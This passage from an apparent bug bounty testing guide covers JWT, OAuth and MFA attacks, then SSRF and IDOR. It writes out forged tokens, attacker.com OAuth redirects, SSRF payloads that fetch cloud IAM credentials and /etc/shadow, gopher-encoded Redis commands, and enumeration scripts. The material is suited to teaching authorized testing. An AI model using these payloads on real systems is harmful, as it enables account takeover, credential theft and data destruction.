- No `Secure` → Cookie sent over HTTP → man-in-the-middle can steal it
- No `SameSite` → Cookie sent in cross-site requests → CSRF possible (see Chapter 27)

---

## Category 5: JWT Vulnerabilities

JSON Web Tokens are widely used for stateless authentication. They have well-documented vulnerabilities.

### JWT Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicGVsZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

[HEADER].[PAYLOAD].[SIGNATURE]

Header (base64):  {"alg":"HS256","typ":"JWT"}
Payload (base64): {"sub":"1234","role":"user"}
Signature: HMACSHA256(header + "." + payload, secret)
```

### Attack 1: Algorithm None

Change the algorithm to `none`, meaning no signature is required:

```json
// Original header
{"alg":"HS256","typ":"JWT"}

// Attack: change to
{"alg":"none","typ":"JWT"}
```

And remove the signature entirely:

```
Modified token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.

Note the trailing dot — empty signature
```

If the server accepts this, it is not verifying the signature and you can forge any payload.

### Attack 2: Algorithm Confusion (RS256 to HS256)

When a server uses asymmetric RS256 (public/private key pair):

```
RS256: signed with private key, verified with public key
HS256: signed with a symmetric secret
```

If the server's code accepts either algorithm and you switch from RS256 to HS256, you can sign the token yourself — using the _public key_ (which is available to you) as the HMAC secret:

```python
# The server's RSA public key is often exposed at /jwks.json or /.well-known/jwks.json

# Take the public key (PEM format)
# Re-sign the modified token with HMAC-SHA256 using the public key as the secret
# Change the alg header to HS256

import jwt
with open('public_key.pem', 'rb') as f:
    public_key = f.read()

payload = {"sub": "1234", "role": "admin"}
forged_token = jwt.encode(payload, public_key, algorithm='HS256')
```

### Attack 3: Weak Secret

If HS256 is used with a weak or guessable secret, the signature can be brute-forced:

```bash
# hashcat JWT cracking
# First, get a valid JWT token
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.SIGNATURE"

# Crack with hashcat (mode 16500 = JWT)
hashcat -a 0 -m 16500 $TOKEN /usr/share/wordlists/rockyou.txt

# Or with john
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

If the secret is found (e.g., "secret", "password", "jwt_secret"), you can sign arbitrary payloads.

### Attack 4: Kid Header Injection

The `kid` (Key ID) header tells the server which key to use for verification. If the server uses the `kid` value unsafely:

```json
// Vulnerable: server does something like:
// key = read_file("/keys/" + kid)
// or: key = db.query("SELECT key FROM keys WHERE id = '" + kid + "'")

{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
// Signs token with empty string (content of /dev/null)

{"alg":"HS256","typ":"JWT","kid":"'; SELECT 'attackersecret' FROM dual-- -"}
// SQL injection in kid parameter
```

### Attack 5: Payload Tampering (Unsigned Tokens)

Some applications use JWTs without proper signature verification. Try simply changing the payload:

```
Original payload: {"sub":"1234","role":"user"}
Modified payload: {"sub":"1234","role":"admin"}

Re-encode the payload in base64 and replace it in the token.
Submit the modified token.
If the server uses the modified role without verification → broken JWT implementation.
```

### Tools for JWT Testing

```bash
# jwt_tool — comprehensive JWT testing
pip3 install jwt_tool --break-system-packages

# Decode a JWT
jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.signature

# Test for alg:none
jwt_tool TOKEN -X a

# Test for algorithm confusion (RS256→HS256)
jwt_tool TOKEN -X k -pk public_key.pem

# Fuzz the kid parameter for SQLi/path traversal
jwt_tool TOKEN -I -hc kid -hv "../../dev/null"

# Brute force secret
jwt_tool TOKEN -C -d wordlist.txt
```

**Burp Extension: JWT Editor** — visual JWT manipulation inside Burp Suite (BApp Store).

---

## Category 6: OAuth Vulnerabilities

OAuth is complex and commonly misconfigured.

### Redirect URI Validation Issues

```
Legitimate OAuth flow:
GET /oauth/authorize?client_id=APP&redirect_uri=https://example.com/callback&...

Attack: Change redirect_uri
GET /oauth/authorize?client_id=APP&redirect_uri=https://attacker.com/steal&...

If the authorization server doesn't strictly validate redirect_uri:
→ Authorization code sent to attacker.com
→ Attacker exchanges code for access token
→ Full account takeover
```

**Test variations:**

```
redirect_uri=https://attacker.com
redirect_uri=https://example.com@attacker.com
redirect_uri=https://example.com.attacker.com
redirect_uri=https://attacker.com/example.com
redirect_uri=https://example.com/callback?next=https://attacker.com
redirect_uri=https://example.com/../../../attacker.com (path traversal)
```

### CSRF on OAuth Authorization Endpoint

```
The state parameter prevents CSRF in OAuth.
If state is missing or not validated:
→ Attacker can initiate OAuth flow on behalf of victim
→ If victim is already logged in to the OAuth provider
→ Victim's account gets linked to attacker's application
```

**Test:** Remove the `state` parameter from the authorization request. Does the server reject it?

### Open Redirect Chaining

If `redirect_uri` must point to the legitimate domain but an open redirect exists on that domain:

```
redirect_uri=https://example.com/redirect?url=https://attacker.com
→ Authorization code lands at example.com/redirect
→ Which immediately redirects to attacker.com with the code in the URL
→ Attacker has the code
```

---

## Category 7: Multi-Factor Authentication Bypasses

### Code Reuse

TOTP codes should be invalidated after use. Test:

1. Log in with valid TOTP code
2. Immediately try the _same_ code on a different session
3. If it works → codes can be reused

### Code Length and Brute Force

A 6-digit TOTP has 1,000,000 possible values. With no rate limiting on the MFA input page:

```bash
# Brute force 6-digit TOTP with Burp Intruder
# Payload: numbers 000000 to 999999
# 30-second window ≈ only ~30 valid codes exist at any time
# But previous window codes sometimes still work

# Tools: Burp Intruder with numeric range payload
```

### Response Manipulation

```
Step 1: Enter wrong TOTP code
Step 2: Intercept the response in Burp
Step 3: Change the response body from "invalid code" to "success"
        or change status 403 to 200

If the client-side handles the redirect/login based on the response body
→ MFA bypassed via response manipulation
```

### Direct Endpoint Access

After the first authentication factor (password) succeeds, the application issues a partial session. Can you skip the MFA step entirely?

```
Normal flow:
POST /login (password) → partial session → redirect to /mfa
POST /mfa (code) → full session → redirect to /dashboard

Attack: After step 1, go directly to /dashboard
If the server considers the partial session as fully authenticated → MFA bypassed
```

---

## Summary

Authentication vulnerabilities span username enumeration, brute force, broken password reset flows, session management failures, JWT implementation errors, OAuth misconfigurations, and MFA bypasses. Each is a potential gateway to account takeover. Testing requires careful observation of error messages, response times, and token structure. JWT-specific attacks (alg:none, algorithm confusion, weak secrets) are particularly rewarding in modern applications. Password reset flows are historically some of the most critical findings in bug bounty programs.

---

## Checklist

- [ ] Tested for username enumeration via login, registration, and password reset error messages
- [ ] Tested for username enumeration via response timing differences
- [ ] Tested login for rate limiting — sent 20+ failed attempts
- [ ] Tested rate limit bypass via X-Forwarded-For IP rotation
- [ ] Analyzed password reset tokens for predictability (sequential, timestamp-based, hashed)
- [ ] Tested password reset token expiry — are old tokens still valid?
- [ ] Tested for Referer header token leakage on reset page
- [ ] Tested Host header injection for password reset poisoning
- [ ] Analyzed session tokens in Burp Sequencer for entropy
- [ ] Tested session fixation — does login issue a new session ID?
- [ ] Tested session invalidation on logout — does old token still work?
- [ ] Checked session cookie flags: HttpOnly, Secure, SameSite
- [ ] Decoded and analyzed any JWT tokens
- [ ] Tested JWT alg:none attack
- [ ] Tested JWT weak secret with hashcat/jwt_tool
- [ ] Checked for jwks.json and tested algorithm confusion
- [ ] Tested OAuth redirect_uri validation with bypass variations
- [ ] Tested for missing OAuth state parameter
- [ ] Tested MFA for code reuse, brute force, and flow bypass
- [ ] Documented all findings with exact request/response pairs

---

# Chapter 19: Server-Side Request Forgery (SSRF)

## Objective

Understand SSRF deeply — how it works, why it's so dangerous in cloud environments, every technique for finding and exploiting it, and how to bypass common filters. SSRF can turn a seemingly minor functionality into access to internal infrastructure, cloud metadata, and in some cases, full server compromise.

## Prerequisites

Chapters 1–18 complete. Understand how servers make HTTP requests, what cloud metadata services are, and how to use Burp Collaborator or interactsh.

## Terminology

|Term|Definition|
|---|---|
|**SSRF**|Server-Side Request Forgery — tricking a server into making HTTP requests on your behalf|
|**Internal Network**|Private IP ranges not accessible from the public internet (10.x, 172.16-31.x, 192.168.x)|
|**Cloud Metadata Service**|An API at a fixed internal IP that cloud VMs use to retrieve instance configuration and credentials|
|**IMDS**|Instance Metadata Service — AWS, GCP, and Azure each have one|
|**Blind SSRF**|The response of the server-side request is not returned to you — only side effects are observable|
|**Full-Response SSRF**|The content of the server-side request is returned in the application's response|
|**Open Redirect**|A redirect vulnerability that can be chained with SSRF to bypass URL filters|
|**DNS Rebinding**|Rapidly changing a domain's DNS record to bypass SSRF IP filters|
|**Gopher Protocol**|An older protocol that can be used in SSRF to send arbitrary TCP data|
|**SSRF Filter**|Application-level protection that blocks certain URLs, IPs, or protocols|
|**Out-of-Band**|Detecting SSRF via a callback to an external server rather than in the response|
|**Collaborator**|Burp Suite's built-in server for receiving out-of-band callbacks (DNS, HTTP, SMTP)|

---

## Theory

### Why SSRF Is Dangerous

When you exploit SSRF, _you are the server_. Requests made via SSRF:

- Come from the server's IP address (bypasses IP allowlists)
- Have access to internal network services (databases, admin panels, internal APIs)
- Can query cloud metadata services that expose credentials
- May bypass firewall rules that allow internal traffic but block external

```
NORMAL:                                      VIA SSRF:
You (external) ──✗──► Internal API          You ──► Server ──► Internal API
You (external) ──✗──► 169.254.169.254        You ──► Server ──► 169.254.169.254
You (external) ──✗──► Redis (6379)           You ──► Server ──► Redis:6379
```

In cloud environments (AWS, GCP, Azure), SSRF is frequently a critical severity finding because it can retrieve IAM credentials with permissions to access the entire cloud infrastructure.

### How SSRF Arises

Any feature where the server fetches a URL or resource you control is a potential SSRF vector:

- **URL fetch features:** "Enter a URL to import content / import RSS feed / import from URL"
- **Webhooks:** "Enter a URL for us to send notifications to"
- **PDF generation:** "Generate a PDF of this URL" — the server renders the page
- **Screenshot services:** "Generate a screenshot of a URL"
- **Image hosting/proxy:** The server fetches an image from your URL
- **Link preview generation:** "Paste a URL to see its preview"
- **File import from URL:** "Import a CSV from this URL"
- **XML parsing with external entities:** (also XXE — see Chapter 23)
- **Internal microservice communication:** Parameters that specify which internal service to call

---

## Finding SSRF

### Step 1: Identify URL Input Points

Look for any parameter that accepts a URL or hostname:

```
url=
link=
src=
source=
target=
host=
hostname=
redirect=
uri=
path=
reference=
fetch=
dest=
callback=
image=
feed=
webhook=
endpoint=
```

Also look in:

- HTTP headers: `X-Forwarded-Host`, `Referer`, `Origin`
- XML/JSON body parameters that might contain URLs
- File import fields

### Step 2: Test with Out-of-Band Detection

Since many SSRFs are blind (you don't see the fetched content), start with out-of-band detection using Burp Collaborator or interactsh:

```bash
# Start interactsh listener
interactsh-client
# → Your URL: abc123def456.oast.live

# In the application, submit:
url=http://abc123def456.oast.live/test

# If you receive a DNS or HTTP hit → SSRF confirmed
```

In Burp Suite:

1. Go to Burp → Burp Collaborator Client
2. Click "Copy to clipboard" — gives you a unique URL like `xyz.burpcollaborator.net`
3. Use this as the URL in the application
4. Click "Poll now" — if DNS/HTTP hits appear → SSRF confirmed

### Step 3: Test for Internal Access

Once SSRF is confirmed, test internal resources:

```
# localhost variations
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/           (IPv6 localhost)
http://127.1/           (shortened IPv4)
http://0/               (resolves to 0.0.0.0)
http://2130706433/      (decimal representation of 127.0.0.1)
http://017700000001/    (octal representation)
http://0x7f000001/      (hex representation)

# Common internal services
http://192.168.1.1/     (router admin panel)
http://10.0.0.1/        (internal host)
http://172.16.0.1/      (internal host)

# Cloud metadata services (see below)
```

---

## The Cloud Metadata Attack

This is the most common high-severity SSRF exploitation scenario.

### AWS EC2 Metadata Service

```
http://169.254.169.254/latest/meta-data/

Key endpoints:
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Exploitation flow:**

```
Step 1: Test for SSRF
url=http://169.254.169.254/latest/meta-data/
→ Response includes metadata paths

Step 2: Get IAM role name
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Response: "my-ec2-role"

Step 3: Get credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role
→ Response:
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "abc123...",
  "Token": "long_session_token...",
  "Expiration": "2026-01-01T00:00:00Z"
}
```

With these credentials, an attacker can authenticate to AWS and access whatever the IAM role permits — S3 buckets, RDS databases, Lambda functions, and more.

**AWS IMDSv2** (the newer version) requires a two-step token-based request. Some applications may still be vulnerable if the instance hasn't migrated:

```
Step 1: Get a token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
→ Response: TOKEN_VALUE

Step 2: Use the token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: TOKEN_VALUE
```

Not all SSRF vectors allow you to set custom headers. IMDSv2 limits the impact of SSRF but doesn't eliminate it.

### Google Cloud Metadata Service

```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

# If the SSRF allows header injection:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Key paths:
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

### Azure Metadata Service

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

# Identity tokens:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F
```

---

## Full-Response SSRF Exploitation

When the server returns the fetched content in its response, SSRF becomes even more powerful.

### Port Scanning the Internal Network

```
# Fast scan common ports
http://192.168.1.1:22/      → Connection refused (port closed) or Timeout (filtered)
http://192.168.1.1:80/      → Response (port open)
http://192.168.1.1:8080/    → Response
http://192.168.1.1:6379/    → Response (Redis!)
http://192.168.1.1:27017/   → Response (MongoDB!)
http://192.168.1.1:3306/    → Response (MySQL!)
http://192.168.1.1:5432/    → Response (PostgreSQL!)
```

Use Burp Intruder with a port number list to automate:

```
Position: http://192.168.1.1:§PORT§/
Payload: numbers 1–65535 (or common ports subset)
Filter: response length differs from "connection refused" response
```

### Reading Internal Files via file:// Protocol

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///var/www/html/config.php
file:///app/config/database.yml
```

Note: `file://` only works if the server-side HTTP client supports it and the security configuration allows it. Many libraries disable file:// by default.

### Attacking Internal Services via Gopher

The `gopher://` protocol can send arbitrary TCP data, enabling attacks against services that don't speak HTTP:

```
# Send a Redis command via gopher
# SET a key on the internal Redis instance:
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0ahello%0d%0a$5%0d%0aworld%0d%0a

# This decodes to: SET hello world
# Sending malicious Redis commands can lead to RCE via cron job injection

# HTTP request via gopher (to bypass URL filters that only block direct IP access)
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
```

---

## Bypassing SSRF Filters

Applications often try to block SSRF by filtering the URL input. Here are bypass techniques:

### IP Address Obfuscation

```
# Standard IPv4
http://127.0.0.1/

# Decimal (127.0.0.1 as single integer)
http://2130706433/
# 127 * 16777216 + 0 * 65536 + 0 * 256 + 1 = 2130706433

# Octal
http://0177.0.0.01/
http://017700000001/

# Hex
http://0x7f000001/
http://0x7f.0x00.0x00.0x01/

# Mixed formats
http://0177.0.0.0x1/
http://127.1/          (short form — 127.0.0.1)
http://127.0.1/        (127.0.0.1)
http://0.0.0.0/        (maps to localhost on some systems)

# IPv6
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/   (IPv6 mapped IPv4)

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/   (127.0.0.1 URL encoded)
http://127.0.0.1%20/                   (trailing space sometimes ignored)
```

### Using a Domain That Resolves to Internal IPs

```
# Create a DNS record pointing to 127.0.0.1
# Many SSRF testing tools have domains:
http://localtest.me/        → resolves to 127.0.0.1
http://lvh.me/              → resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/  → resolves to 127.0.0.1

# Create your own:
# Point attacker.com A record → 127.0.0.1
# Submit: url=http://attacker.com/
# Filter sees a domain, not a blocked IP
# DNS resolution happens server-side → 127.0.0.1
```

### Open Redirect Chaining

If SSRF filters block direct IP input but the application has an open redirect:

```
# Open redirect at: https://example.com/redirect?url=ANYTHING

# SSRF filter allows example.com (the legitimate app domain)
url=https://example.com/redirect?url=http://169.254.169.254/latest/meta-data/

# The filter sees "example.com" and allows it
# The server fetches the redirect URL, which redirects to the metadata service
# The server follows the redirect → SSRF achieved
```

### DNS Rebinding

This is a sophisticated bypass for time-of-check/time-of-use (TOCTOU) race conditions in SSRF filters:

```
1. Configure a domain with a very short TTL (e.g., 0 seconds)
2. Point it to a legitimate IP first
3. The filter checks the domain → resolves to legitimate IP → allowed
4. Immediately change the DNS record to 127.0.0.1
5. When the server makes the actual request → DNS resolves to 127.0.0.1
6. Request hits localhost

Tools: singularity (https://github.com/nccgroup/singularity) automates DNS rebinding
```

### Protocol-Based Bypasses

```
# Some filters check for http/https but allow others
dict://127.0.0.1:6379/info       (Redis info via dict protocol)
sftp://attacker.com              (SFTP might bypass HTTP-only filters)
ldap://127.0.0.1:389/            (LDAP)
tftp://127.0.0.1:69/test         (TFTP)
```

### Abuse URL Parsing Inconsistencies

Different URL parsers behave differently:

```
http://127.0.0.1#.example.com     (fragment ignored, goes to 127.0.0.1)
http://127.0.0.1?.example.com     (query string, some parsers stop at ?)
http://example.com\@127.0.0.1/   (backslash as separator in some parsers)
http://127.0.0.1:80@example.com/ (username:port@host — some parsers use host before @)
http://[google.com]              (brackets trick some parsers)
```

---

## Blind SSRF: Out-of-Band Detection Strategies

When you can't see the response content, use side channels:

### DNS-Based Detection

Most reliable — DNS queries are almost never blocked:

```bash
# Use interactsh
interactsh-client
# Submit: url=http://UNIQUE.oast.live
# Even if HTTP is blocked, DNS lookup reveals SSRF
```

### Response Time Differences

```
url=http://192.168.1.1/    → 30ms response (port open, internal host exists)
url=http://192.168.99.1/   → 30000ms timeout (no host)
url=http://192.168.1.1:22/ → 50ms (SSH port open, immediate response)
url=http://192.168.1.1:9999/→ 30000ms timeout (port closed)

Time differences reveal internal network topology without seeing content.
```

### Blind SSRF to Internal Service Attacks

Even without seeing responses, you can still cause damage:

```
# Trigger a POST to an internal API
# If the internal API has no authentication (assumes internal traffic is trusted):
url=http://internal-api/admin/delete-all-users

# Trigger an action in an internal admin panel
url=http://10.0.0.5:8080/admin/add-user?username=attacker&role=admin

# Hit a Redis server with a dangerous command (via gopher)
# No response needed — the command executes on the Redis server
```

---

## Demonstrating Impact

Severity of SSRF depends heavily on what internal resources are accessible.

|What You Reach|Severity|
|---|---|
|Cloud metadata with IAM credentials|Critical|
|Internal admin panel|Critical|
|Internal API with no auth|Critical/High|
|Internal database directly|Critical|
|Blind SSRF (internal port scan only)|Medium|
|External SSRF (only reaches public internet)|Low|
|SSRF to localhost with no interesting services|Low–Medium|

**For your report:**

1. Prove SSRF with an out-of-band DNS callback (screenshot of interactsh/Collaborator hit)
2. Show the exact request that triggers it
3. If cloud metadata → show the request that retrieves credentials (censor the actual key values in the report — do not include real credentials)
4. If internal service → show the response from the internal service
5. Describe the theoretical maximum impact based on what IAM permissions allow (check via `aws sts get-caller-identity`, then note the role's attached policies)

---

## Summary

SSRF tricks servers into making HTTP requests on the attacker's behalf, providing access to internal networks, services, and — most critically in cloud environments — instance metadata containing IAM credentials. Finding SSRF requires identifying all URL input points and testing them with out-of-band callbacks. Bypassing filters requires IP obfuscation, DNS-based bypasses, open redirect chaining, and DNS rebinding. Full-response SSRF enables port scanning, file reading, and internal service exploitation. Blind SSRF is still exploitable for internal network attacks even without visible response data.

---

## Checklist

- [ ] Identified all URL/hostname input parameters in the application
- [ ] Tested each with a Burp Collaborator / interactsh URL for OOB detection
- [ ] Confirmed SSRF via DNS or HTTP callback
- [ ] Tested for localhost access (127.0.0.1 and aliases)
- [ ] Tested for cloud metadata endpoint (169.254.169.254)
- [ ] Attempted to retrieve IAM credentials from metadata service
- [ ] Tested file:// protocol support
- [ ] Tested gopher:// protocol support
- [ ] Tested dict:// and other alternative protocols
- [ ] Attempted internal port scan via response time differences
- [ ] Tested IP obfuscation bypasses (decimal, octal, hex, IPv6)
- [ ] Tested domain-based bypass (domain resolving to 127.0.0.1)
- [ ] Tested open redirect chaining
- [ ] Checked all HTTP headers (Host, X-Forwarded-For, Referer) as SSRF vectors
- [ ] Checked XML and JSON body parameters for URL fields
- [ ] Documented the maximum impact based on internal resources reachable
- [ ] Did NOT use real AWS credentials retrieved — noted them without misusing

---

# Chapter 20: Insecure Direct Object References (IDOR)

## Objective

Master IDOR — one of the most commonly found and rewarded vulnerabilities in bug bounty programs. Understand how to identify every type of object reference, systematically test for unauthorized access, and build automation to scale your IDOR testing across an entire application.

## Prerequisites

Chapters 1–19 complete. You need at least two test accounts. Understand JSON, REST APIs, and how to use Burp Suite Repeater and Intruder.

## Terminology

|Term|Definition|
|---|---|
|**IDOR**|Insecure Direct Object Reference — accessing an object (record, file, user) by manipulating its identifier without proper authorization checks|
|**Object Reference**|Any identifier used to retrieve a specific resource: integer ID, UUID, filename, hash|
|**Horizontal IDOR**|Accessing another user's resource at the same privilege level|
|**Vertical IDOR**|Accessing a resource that requires higher privileges than you have|
|**Sequential ID**|An integer ID that increments predictably (1, 2, 3...) — easiest to exploit|
|**UUID**|Universally Unique Identifier — 128-bit random ID (harder to guess, but not authorization)|
|**Indirect Reference**|A reference that maps to an object internally, obscuring the real ID|
|**Enumeration**|Systematically iterating through identifiers to find accessible objects|
|**Mass Enumeration**|Using automation to test thousands of IDs quickly|
|**State-changing IDOR**|IDORs that modify or delete data (higher severity than read-only)|

---

## Theory

### The Core Vulnerability

IDOR occurs when an application uses user-controlled input to directly reference an object without verifying that the requesting user has permission to access that specific object.

```
User Alice has account ID 1001.
User Bob has account ID 1002.

Correct behavior:
  Alice requests GET /api/account/1002 → 403 Forbidden

Vulnerable behavior:
  Alice requests GET /api/account/1002 → 200 OK with Bob's data
```

The application authenticates Alice correctly (knows who she is), but fails to check whether Alice is _authorized_ to access account 1002.

### Why This Happens

Developers often write authorization logic like:

```python
# Correct: checks if the requesting user owns the resource
@app.route('/api/account/<int:account_id>')
def get_account(account_id):
    if current_user.id != account_id:
        return 403
    return db.get_account(account_id)
```

But in practice, it often looks like:

```python
# Incorrect: no ownership check
@app.route('/api/account/<int:account_id>')
def get_account(account_id):
    return db.get_account(account_id)  # Anyone can read any account
```

Or authorization is checked in the front end but not the API:

```javascript
// Front end only shows the user their own account
// But the API doesn't enforce it
```

### Types of Object References

|Reference Type|Example|Exploitability|
|---|---|---|
|Sequential integer|`?id=1234`|Very easy — just increment|
|Negative/zero|`?id=0`, `?id=-1`|Easy — try boundary values|
|UUID v4|`?id=550e8400-e29b-41d4-a716-446655440000`|Hard to guess — but may be discoverable|
|Hash|`?id=5f4dcc3b5aa765d61d8327deb882cf99`|May be predictable if MD5(user_id)|
|Username/email|`?user=alice`|Easy to test with known usernames|
|Filename|`?file=invoice_1234.pdf`|Try other invoice numbers|
|Encoded ID|`?id=dXNlcl8xMjM0` (base64)|Decode, modify, re-encode|
|Hashed ID|`?id=sha256(user_id+salt)`|Hard unless salt is known|

---

## Finding IDOR: Systematic Methodology

### Phase 1: Build Your Reference Map

While browsing the application with both test accounts, note every object reference you encounter:

```
Account A (alice):
  User ID: 1001
  Order IDs: 5001, 5002
  Invoice IDs: 9001
  File IDs: abc-def-001
  Message IDs: m_1001_a, m_1001_b

Account B (bob):
  User ID: 1002
  Order ID: 5003
  Invoice ID: 9002
  File ID: abc-def-002
  Message IDs: m_1002_a
```

### Phase 2: Test Cross-Account Access

Log in as Alice. Take every one of Bob's object references and request them:

```
As Alice, test:
GET /api/orders/5003        → Should be 403, is it?
GET /api/invoices/9002      → Should be 403, is it?
GET /api/files/abc-def-002  → Should be 403, is it?
GET /api/messages/m_1002_a  → Should be 403, is it?
```

**In Burp Suite:** Use the Repeater to modify each request. Capture Alice's request for her own resource, then change the ID to Bob's.

### Phase 3: Test State-Changing Operations

IDOR isn't just about reading data. Test write operations:

```
DELETE /api/orders/5003        → Can Alice delete Bob's order?
PUT    /api/orders/5003        → Can Alice modify Bob's order?
POST   /api/orders/5003/cancel → Can Alice cancel Bob's order?
POST   /api/messages/m_1002_a/read → Can Alice mark Bob's message as read?
```

State-changing IDORs are higher severity than read-only IDORs.

### Phase 4: Enumerate Sequentially

For sequential integer IDs, use Burp Intruder to enumerate a range:

```
Request: GET /api/orders/§ID§
Attack type: Sniper
Payload type: Numbers
From: 5000, To: 5100, Step: 1

Filter results by:
- Response code = 200 (found)
- Response length differs from "not found" response
```

### Phase 5: Decode Non-Obvious References

When IDs are not simple integers, decode them:

```bash
# Base64
echo "dXNlcl8xMjM0" | base64 -d
# → user_1234

# Hex
echo "313233" | xxd -r -p
# → 123

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('user%5F1234'))"
# → user_1234

# JWT (see Chapter 18)
# The sub or user_id claim in a JWT is often an object reference
```

After decoding, modify the value and re-encode:

```bash
# Change user_1234 to user_1235, re-encode
echo -n "user_1235" | base64
# → dXNlcl8xMjM1
```

---

## Where to Find IDORs: The Complete Target List

Every endpoint that retrieves, modifies, or deletes a specific resource is an IDOR candidate.

### User and Account Resources

```
GET    /api/users/:id
GET    /api/users/:id/profile
GET    /api/users/:id/activity
PUT    /api/users/:id
DELETE /api/users/:id
GET    /api/account/settings
GET    /account/:username
```

### Orders and Transactions

```
GET    /api/orders/:id
GET    /api/orders/:id/details
GET    /api/orders/:id/invoice
POST   /api/orders/:id/cancel
GET    /api/transactions/:id
GET    /api/payments/:id
GET    /api/invoices/:id
```

### Files and Documents

```
GET    /api/files/:id
GET    /documents/:filename
GET    /uploads/:filename
GET    /api/attachments/:id
GET    /exports/:id.csv
GET    /reports/:id/download
```

### Messages and Notifications

```
GET    /api/messages/:id
POST   /api/messages/:id/read
DELETE /api/messages/:id
GET    /api/notifications/:id
```

### API Objects (REST)

```
# Any REST API with resource IDs
GET    /api/v1/posts/:id
GET    /api/v1/comments/:id
GET    /api/v1/projects/:id
GET    /api/v1/tasks/:id
GET    /api/v1/tickets/:id
```

### Password Reset and Email Verification

```
GET  /verify-email?token=:token   → Can you use someone else's token?
GET  /reset-password?token=:token → Can you use an expired token you found?
GET  /unsubscribe?id=:id          → Can you unsubscribe other users?
```

### Admin Endpoints

```
GET    /admin/users/:id
DELETE /admin/users/:id/delete
GET    /admin/orders/:id
GET    /admin/logs/:id
```

---

## Advanced IDOR Techniques

### IDOR via HTTP Method Change

An endpoint may check authorization for GET but not for other methods:

```
GET    /api/orders/5003 → 403 (access check in place for GET)
DELETE /api/orders/5003 → 200 (access check missing for DELETE)
POST   /api/orders/5003/refund → 200 (access check missing for POST)
```

### IDOR in Request Body (Not URL)

IDs are sometimes passed in the request body or as JSON parameters:

```http
POST /api/getDocument HTTP/1.1
Content-Type: application/json

{"document_id": 9002, "action": "view"}
```

Changing `9002` to another user's document ID tests for IDOR.

### IDOR via Indirect Reference Manipulation

Sometimes the visible ID is indirect — it maps to a real object internally. But there may also be direct access:

```
Application uses:  GET /api/orders/REF-001
                   Internally maps to order ID 5003

Also try:          GET /api/orders/5003  (direct ID — may also work)
```

### IDOR in GraphQL

GraphQL queries often include object IDs in the query body:

```graphql
query {
  user(id: "1001") {
    name
    email
    orders {
      id
      total
    }
  }
}
```

Change `id: "1001"` to `id: "1002"`. If the server doesn't check authorization, you get Bob's data.

```graphql
# Also test mutations
mutation {
  deleteOrder(id: "5003") {
    success
  }
}
```

### IDOR in Referrer/Origin Headers

Some applications use the Referer header to determine which user's data to return:

```http
GET /api/account/details HTTP/1.1
Referer: https://example.com/user/1002/dashboard

# If the server trusts the Referer to determine user context:
# Change user ID in Referer to access different user's data
```

### UUID IDORs

UUIDs are not sequential (hard to guess), but you can still find them:

**Leak via API response:**

```json
// A search result or list endpoint may expose other users' UUIDs
GET /api/users/search?q=bob
Response: [{"id": "550e8400-e29b-41d4-a716-446655440000", "name": "Bob"}]

// Now test: GET /api/users/550e8400-e29b-41d4-a716-446655440000/private-data
```

**Leak via error messages:**

```
"Error: User 550e8400-e29b-41d4-a716-446655440000 not found in this team"
```

**Predictable UUIDs:** UUID v1 is time-based and partially predictable. UUID v3 and v5 are generated from a namespace + name (e.g., MD5(namespace + user_email)) — potentially guessable.

---

## Automation at Scale

### Burp Intruder for Enumeration

```
Attack: Sequential integer enumeration
Request: GET /api/orders/§ID§ HTTP/1.1
Payload: Numbers 1–10000
Grep match: "order_id" (in response body)
Filter: Status 200

This quickly maps which order IDs exist and are accessible.
```

### ffuf for IDOR Testing

```bash
# Create a list of test IDs
seq 1 1000 > ids.txt

# Test each ID
ffuf -w ids.txt \
     -u https://example.com/api/orders/FUZZ \
     -H "Cookie: session=ALICE_SESSION" \
     -mc 200 \
     -o idor_results.json

# Compare: which IDs return 200 that shouldn't belong to Alice?
```

### Python Script for Cross-Account IDOR

```python
import requests

# Alice's session (you're testing as Alice)
alice_session = "ALICE_SESSION_TOKEN"

# Bob's object IDs (collected while logged in as Bob)
bob_orders = [5003, 5004, 5005]

headers = {"Cookie": f"session={alice_session}"}

for order_id in bob_orders:
    r = requests.get(
        f"https://example.com/api/orders/{order_id}",
        headers=headers
    )
    if r.status_code == 200:
        print(f"[IDOR CONFIRMED] Order {order_id}: {r.text[:100]}")
    else:
        print(f"[Blocked] Order {order_id}: {r.status_code}")
```

---

